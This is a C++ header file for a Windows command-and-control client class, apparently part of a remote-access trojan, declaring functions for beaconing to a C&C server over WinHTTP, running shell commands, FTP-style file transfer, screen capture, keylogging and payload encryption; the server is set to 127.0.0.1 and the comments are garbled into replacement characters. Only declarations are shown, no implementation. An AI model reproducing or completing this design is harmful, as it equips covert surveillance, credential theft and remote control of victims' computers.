#pragma once
#include "commandManager.h"
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>
#include <string>
#include <list>
#include <mutex>

class cncManager
{
private:
	LPCWSTR
		/* �ϴ� C&C �������� ���̶� �׽�Ʈ��*/
		server = L"127.0.0.1",
		index = L"/tests";


	std::list<std::string> shellCmd;
	std::string ftpPath = "";
	

public:
	cncManager();
	cncManager(LPCWSTR server);
	~cncManager();
	void responseParser(UCHAR* res, DWORD len);
	void sendHttpRequest(LPVOID data, DWORD dlen);
	void sendBeacon();
	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream);
	void printParsedResponse(DDprotocol* resData, std::string data);
	void handleShellRequest();
	void handleFtpRequest(std::string path);
	void handleFtpResponse(std::string data, DWORD seq);
	void handleScreenRequest();
	void handleKeyLog();
	/* ��ȣȭ�� ����� ���Ǹ� ���ؼ� �������� �����ϴ°ɷ� */
	LPVOID dataEncrypt(LPVOID data);
	LPVOID dataDecrypt(LPVOID data);
	bool print_setting = false;
	std::mutex m1, m2;
};
